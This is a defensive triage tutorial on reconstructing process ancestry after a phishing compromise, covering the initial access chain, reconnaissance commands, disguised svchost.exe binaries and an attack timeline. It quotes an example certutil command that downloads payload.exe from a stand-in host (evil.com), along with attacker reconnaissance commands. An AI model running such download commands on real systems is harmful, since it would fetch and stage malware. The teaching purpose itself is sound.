Reconstructing the sequence of execution events on a compromised endpoint is one of the most critical parts of triage. Process ancestry shows the parent-child relationships, command-line arguments, and timestamps of every process execution, mapping out the attacker's timeline.

---
## 1. Finding the Initial Access Vector

When analyzing a suspicious process tree, look at the root (the original parent) of the execution chain.

For example, you investigate an alert and find this ancestry: `OUTLOOK.EXE` -> `WINWORD.EXE` -> `cmd.exe` -> `powershell.exe -Enc <base64>` -> `certutil.exe -urlcache http://evil.com/payload.exe`

[!IMPORTANT] The initial access vector in this scenario is a **Phishing email with a malicious Word attachment that contains an encoded PowerShell macro to download a payload**. The chain reveals that the user opened an email client (`OUTLOOK.EXE`), which spawned Microsoft Word (`WINWORD.EXE`), which subsequently triggered command execution commands.

---
## 2. Post-Exploitation Reconnaissance

Once initial execution succeeds, attackers typically seek to understand their context within the environment.
When an attacker runs commands like `whoami /all`, `ipconfig /all`, and `net group "Domain Admins" /domain` via `cmd.exe` processes:

[!NOTE] This represents the **post-exploitation reconnaissance where the attacker is mapping the environment before escalating privileges or moving laterally**. The attacker is gathering information on:

- Who they are running as (`whoami`)

- Where they are on the network (`ipconfig`)

- Who is in charge (`net group`)
---
## 3. Disguised Binaries & Path Validation

A common evasion tactic is renaming a malicious executable to look like a critical Windows system binary.

For example, you see `svchost.exe` (PID 5100) running from: `C:\Users\jsmith\AppData\Local\Temp\svchost.exe`

...instead of the legitimate path: `C:\Windows\System32\svchost.exe`

[!WARNING] **This is a renamed malicious binary using a legitimate Windows process name for disguise, a strong indicator of compromise**. Legitimate core system binaries (like `svchost.exe`, `lsass.exe`, `lsm.exe`, `smss.exe`) should only ever run from the `System32` directory. Any instances of these files running out of Temp, AppData, or other user directories are indicators of malicious execution.

---
## 4. Reconstructing the Attack Timeline

By documenting each node of the process tree, analysts can construct a forensic timeline to track attacker propagation:

```
  [ TIME ]         [ PROCESS PATH ]                [ ARGUMENTS / ACTIONS ]
  14:22:05   -->   OUTLOOK.EXE             -->   User opens email attachment
  14:22:15   -->   WINWORD.EXE             -->   Office document macros enabled
  14:22:18   -->   cmd.exe / powershell    -->   Encoded payload command executed
  14:22:25   -->   certutil.exe            -->   Outbound connection to pull payload.exe
  14:22:30   -->   payload.exe             -->   Establishes persistence
```
